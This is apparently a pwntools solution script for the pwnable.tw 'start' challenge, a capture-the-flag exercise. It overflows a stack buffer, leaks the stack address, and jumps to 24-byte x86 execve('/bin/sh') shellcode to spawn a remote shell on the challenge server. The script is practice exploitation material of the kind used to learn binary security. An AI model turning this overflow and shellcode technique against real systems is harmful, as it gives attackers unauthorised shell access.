from pwn import *

#p = process("/home/kali-sg/Scaricati/CTFs/pwnable/start/start")
p = remote("chall.pwnable.tw", 10000)

static = 1;

# x86/linux/exec: 24 bytes
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
    "\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)

padding = 'A'*20

def no_aslr_mode():
	static_esp = 0xffffd33c
	success("ESP = " + hex(static_esp))
	payload_static = padding + p32(static_esp) + shellcode
	p.sendafter("Let's start the CTF:", payload_static)
	with open("expl.txt", "wb") as f:
		f.write(payload_static)

def aslr_mode():
	write_addr = 0x08048087
	retn_addr = p32(write_addr)
	payload = padding + retn_addr
	p.sendafter("Let's start the CTF:", payload)
	esp = u32(p.recv()[:4])
	retn_addr = esp+20
	success("Leaked ESP = " + hex(esp))
	success("Return Address = " + hex(retn_addr))
	payload = padding + p32(retn_addr) + shellcode
	p.send(payload);

if(static == 0):
	no_aslr_mode()
else:
	aslr_mode()

p.interactive()
